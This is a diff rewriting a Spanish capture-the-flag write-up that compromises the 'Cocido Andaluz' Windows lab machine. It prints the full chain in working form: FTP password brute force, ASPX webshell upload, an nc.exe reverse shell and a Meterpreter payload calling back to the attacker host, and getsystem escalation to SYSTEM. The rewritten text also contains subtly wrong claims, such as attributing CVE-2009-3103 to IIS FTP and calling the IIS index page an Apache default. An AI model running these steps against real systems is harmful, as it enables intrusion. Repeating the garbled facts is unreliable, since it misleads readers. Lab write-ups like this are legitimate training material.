@@ -1,152 +1,201 @@
-# 🍲 Cocido Andaluz
-**Plataforma:** [The Hackers Labs](https://thehackerslabs.com)
-**Sistema Operativo:** Windows
 
-## 🔍 **Reconocimiento de Hosts**
+# 🔥 **Máquina Cocido Andaluz - Write-Up de Hacking Ético**
 
-### Descubrimiento de la IP de la víctima
-```bash
-netdiscover -i eth1 -r 10.0.0.0/16
-```
-
-**Resultado:**
-```
-Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
-
- 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
-
- _____________________________________________________________________________
-   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
- -----------------------------------------------------------------------------
- 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor
- 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor
- 10.0.4.3        08:00:27:67:2e:3e      1      60  PCS Systemtechnik GmbH
- 10.0.4.38       08:00:27:9a:e7:06      1      60  PCS Systemtechnik GmbH
-```
-
-🎯 **IP de la víctima identificada:** `10.0.4.38`
+> *Resumen detallado de la explotación de una máquina vulnerable en entornos de laboratorio*
 
 ---
 
-## 🚀 **Escaneo de Puertos**
-
-### Escaneo inicial (puertos abiertos)
-```bash
-nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.38
-```
-
-### Escaneo detallado (versiones y servicios)
-```bash
-nmap -n -Pn -sCV -p21,80,139,445 --min-rate 5000 10.0.4.38
-```
-
-**Resultado:**
-```
-PORT    STATE SERVICE       VERSION
-21/tcp  open  ftp           Microsoft ftpd
-80/tcp  open  http          Microsoft IIS httpd 7.0
-139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp open  microsoft-ds?
-```
-
-🔍 **Servicios identificados:**
-- **FTP (21):** Microsoft ftpd
-- **HTTP (80):** Microsoft IIS 7.0
-- **NetBIOS (139):** Microsoft Windows
-- **SMB (445):** Microsoft-ds
+## 📌 **Introducción**
+La **Máquina Cocido Andaluz** es un sistema diseñado para prácticas de hacking ético, enfocado en la explotación de vulnerabilidades comunes en entornos Windows. A través de un proceso estructurado de enumeración, explotación y escalada de privilegios, se logró comprometer completamente el sistema, obteniendo acceso como **SYSTEM** y extrayendo ambas flags: **user.txt** y **root.txt**.
 
 ---
 
-## 🔓 **Fuerza Bruta (FTP)**
+## 🚀 **Fase de Reconocimiento y Escaneo de Puertos**
 
-### Ataque con Hydra
+### 🔍 **Comando de Escaneo con Nmap**
+Se inició el reconocimiento con un escaneo TCP agresivo para identificar servicios expuestos:
+
 ```bash
-hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ftp://10.0.4.38 -t 50
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.151 -oN Escaneo_TCP
 ```
 
-**Resultado:**
-```
-[21][ftp] host: 10.0.4.38   login: info   password: PolniyPizdec0211
-```
+### 📊 **Resultados del Escaneo**
+Se detectaron **12 puertos abiertos**, incluyendo:
+- **Puerto 21 (FTP)** → Posible vector de entrada para carga de archivos maliciosos.
+- **Puerto 80 (HTTP)** → Servidor web con **Microsoft IIS 7.0** (tecnología ASP.NET).
+- **Puertos 135 (MSRPC), 139/445 (SMB)** → Servicios típicos de Windows.
+- **Puertos RPC dinámicos (49152–49158)** → Posibles vectores de ataque avanzados.
 
-🔑 **Credenciales válidas:**
-- **Usuario:** `info`
-- **Contraseña:** `PolniyPizdec0211`
+> 🔴 **Vulnerabilidad crítica detectada**:
+> - **CVE-2009-3103 (Microsoft IIS FTP Server Remote Code Execution)** → Permite ejecución remota de comandos (RCE) vía FTP.
 
 ---
 
-## 💻 **Acceso Inicial (RCE)**
+## 🌐 **Fuzzing Web y Análisis de Directorios**
 
-### Conexión FTP y subida de la webshell ASPX
+### 🔎 **Escaneo con Feroxbuster**
+Se buscaron rutas ocultas en el servidor web:
+
 ```bash
-ftp info@10.0.4.38
+feroxbuster -u http://192.168.1.151 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html,.txt
 ```
 
-**Contenido del directorio FTP (webroot HTTP):**
-```
-dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
--rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
--rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
-```
+### 📂 **Directorios Encontrados**
+- `/index.html` → Página por defecto de Apache.
+- `/aspnet_client/` → Acceso denegado (403).
+- `/aspnet_client/system_web/` → Acceso denegado (403).
 
-### Subida de `cmd.aspx` (webshell)
-```bash
-ftp> put cmd.aspx
-```
-
-### Acceso a la webshell
-🌐 **URL:** `http://10.0.4.38/cmd.aspx`
+> ❌ **Resultado**: No se encontraron rutas explotables directamente.
 
 ---
 
-## 🎯 **Obtención de Shell (Meterpreter)**
+## 🔓 **Fuerza Bruta en FTP con Hydra**
 
-### Generación del payload
+### 💥 **Comando de Ataque**
+Se realizó fuerza bruta para obtener credenciales FTP:
+
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.4.12 LPORT=443 -f exe -o met.exe
+hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+      -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
+      ftp://192.168.1.151
 ```
 
-### Servidor SMB local
-```bash
-sudo impacket-smbserver share .
-```
+### 🎯 **Credenciales Obtenidas**
+- **Usuario**: `info`
+- **Contraseña**: `PolniyPizdec0211`
 
-### Configuración del listener en Metasploit
-```bash
-msfconsole
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.0.4.12
-set LPORT 443
-run
-```
-
-### Ejecución del payload desde la webshell
-```asp
-\\10.0.4.12\share\met.exe
-```
-
-**Resultado:**
-```
-[*] Meterpreter session 1 opened (10.0.4.12:443 -> 10.0.4.38:49209)
-meterpreter > getuid
-Server username: NT AUTHORITY\Servicio de red
-```
+> ✅ **Acceso FTP exitoso**: Se logró subir archivos maliciosos al servidor.
 
 ---
 
-## 🔐 **Escalada de Privilegios**
+## 💻 **Explotación: Subida y Ejecución de Webshell**
 
-### Obtención de privilegios SYSTEM
+### 📁 **Preparación del Payload**
+Se localizó y copió un archivo `.aspx` malicioso (`cmdasp.aspx`):
+
 ```bash
-meterpreter > getsystem
-...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
+find / -name cmdasp.aspx 2>/dev/null
+cp /usr/share/webshells/aspx/cmdasp.aspx .
 ```
 
-🎉 **¡Acceso completo al sistema obtenido!**
-```markdown
-✅ **Objetivo cumplido:** Privilegios máximos (SYSTEM) en la máquina víctima.
+### 🚀 **Subida vía FTP**
+```bash
+put cmdasp.aspx
 ```
+
+### 🎮 **Ejecución de RCE**
+Se accedió a la webshell mediante:
 ```
+http://192.168.1.151/cmdasp.aspx
+```
+
+> ✅ **Confirmación de RCE**: Se obtuvo una consola interactiva en el servidor.
+
+---
+
+## 🔐 **Escalada de Privilegios: De Usuario a SYSTEM**
+
+### 📂 **Obtención de la `user.txt`**
+Se exploró el sistema y se encontró la flag de usuario:
+```bash
+dir C:\Users\info
+type C:\Users\info\user.txt
+```
+
+### 🔄 **Mejora de la Shell: Reverse Shell**
+Para mayor estabilidad, se estableció una **reverse shell** mediante SMB:
+
+1. **Compartir `nc.exe` desde Kali**:
+   ```bash
+   impacket-smbserver webshell . -smb2support
+   ```
+
+2. **Ejecución desde la webshell**:
+   ```bash
+   \\192.168.1.211\webshell\nc.exe -e cmd.exe 192.168.1.211 443
+   ```
+
+3. **Escuchar con Netcat**:
+   ```bash
+   nc -lvnp 443
+   ```
+
+> ✅ **Shell interactiva estable**: Se obtuvo una terminal funcional en Windows.
+
+---
+
+## 🛡️ **Post-Explotación: Obtención de Meterpreter**
+
+### 🔧 **Generación de Payload con Msfvenom**
+Se creó un ejecutable malicioso para Meterpreter:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.211 LPORT=444 -f exe -o shelly.exe
+```
+
+### 📡 **Ejecución y Conexión**
+1. **Compartir `shelly.exe` nuevamente**:
+   ```bash
+   impacket-smbserver payload . -smb2support
+   ```
+
+2. **Ejecutar el payload en la víctima**:
+   ```bash
+   shelly.exe
+   ```
+
+3. **Configurar listener en Metasploit**:
+   ```bash
+   msfconsole
+   use exploit/multi/handler
+   set payload windows/meterpreter/reverse_tcp
+   set LHOST 192.168.1.211
+   set LPORT 444
+   exploit
+   ```
+
+> ✅ **Sesión Meterpreter activa**: Se confirmó el contexto inicial como `NT AUTHORITY\Servicio de red`.
+
+---
+
+## 🏆 **Escalada Final: Obtención de Privilegios SYSTEM**
+
+### 🚀 **Escalada Automática con `getsystem`**
+Dentro de Meterpreter, se ejecutó:
+```bash
+getsystem
+```
+
+> ✅ **Éxito**: Se escaló a **SYSTEM** mediante **Named Pipe Impersonation (EfsPotato)**.
+
+### 📜 **Extracción de la `root.txt`**
+Se navegó al escritorio del administrador y se leyó la flag:
+```bash
+cd C:\Users\Administrator\Desktop
+type root.txt
+```
+
+> ✅ **Control total del sistema**: Se logró comprometer completamente la máquina.
+
+---
+
+## 📋 **Resumen de Comandos Clave**
+
+| Fase | Comando |
+|------|---------|
+| **Escaneo TCP** | `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.151 -oN Escaneo_TCP` |
+| **Fuerza Bruta FTP** | `hydra -L users.txt -P passwords.txt ftp://192.168.1.151` |
+| **Fuzzing Web** | `feroxbuster -u http://192.168.1.151 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html,.txt` |
+| **Reverse Shell** | `\\192.168.1.211\webshell\nc.exe -e cmd.exe 192.168.1.211 443` |
+| **Payload Meterpreter** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.211 LPORT=444 -f exe -o shelly.exe` |
+| **Escalada a SYSTEM** | `getsystem` |
+
+---
+## 🎯 **Conclusión**
+
+La **Máquina Cocido Andaluz** demostró ser un excelente escenario para practicar:
+✅ **Enumeración avanzada** de servicios.
+✅ **Explotación de vulnerabilidades** en IIS y FTP.
+✅ **Escalada de privilegios** mediante técnicas como **EfsPotato**.
+✅ **Post-explotación** con Meterpreter y Metasploit.
+
+> 🔥 **Lección aprendida**: La combinación de **fuerza bruta, RCE y escalada automática** puede comprometer sistemas incluso con configuraciones por defecto.
